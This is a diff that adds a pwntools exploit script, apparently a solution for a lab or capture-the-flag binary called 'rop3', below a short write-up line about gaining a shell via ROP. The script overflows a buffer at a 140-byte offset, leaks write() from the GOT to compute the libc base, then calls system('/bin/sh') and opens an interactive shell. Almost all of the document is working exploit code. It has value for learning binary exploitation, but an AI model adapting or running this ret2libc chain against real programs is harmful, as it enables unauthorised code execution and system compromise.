@@ -129,3 +129,70 @@
  '\n'
  'This demonstrates successfully gaining a shell by exploiting the buffer '
  'overflow vulnerability using a ROP attack with pwntools.')
+
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386', os='linux')
+
+# Load the binary
+elf = ELF('./rop3')
+
+# Start the process
+p = process(elf.path)
+
+# Find the offset to EIP using cyclic patterns
+offset = 140  # Based on buffer size and stack layout of the function
+
+# Addresses of functions and symbols
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+main_addr = elf.symbols['main']
+
+# Stage 1: Leak write() address from GOT
+log.info("Stage 1: Leaking write() address from GOT")
+
+# Build ROP chain to call write(1, write_got, 4)
+payload = b'A' * offset
+payload += p32(write_plt)
+payload += p32(main_addr)    # Return to main after write
+payload += p32(1)            # File descriptor (stdout)
+payload += p32(write_got)    # Address to leak
+payload += p32(4)            # Number of bytes to write
+
+# Send the payload
+p.sendline(payload)
+
+# Receive the leaked address
+leaked_write = p.recv(4)
+write_addr = u32(leaked_write)
+log.success(f"Leaked write() address: {hex(write_addr)}")
+
+# Load the libc library to calculate base addresses
+# Replace '/lib/i386-linux-gnu/libc.so.6' with the path to the libc used by the binary
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+# Calculate libc base address
+libc_base = write_addr - libc.symbols['write']
+log.info(f"libc base address: {hex(libc_base)}")
+
+# Calculate system() and "/bin/sh" addresses
+system_addr = libc_base + libc.symbols['system']
+binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
+log.info(f"system() address: {hex(system_addr)}")
+log.info(f'"/bin/sh" address: {hex(binsh_addr)}')
+
+# Stage 2: Call system("/bin/sh")
+log.info("Stage 2: Calling system('/bin/sh')")
+
+# Build ROP chain to call system("/bin/sh")
+payload2 = b'A' * offset
+payload2 += p32(system_addr)
+payload2 += p32(main_addr)   # Return to main after system (optional)
+payload2 += p32(binsh_addr)
+
+# Send the second payload
+p.sendline(payload2)
+
+# Interact with the shell
+p.interactive()
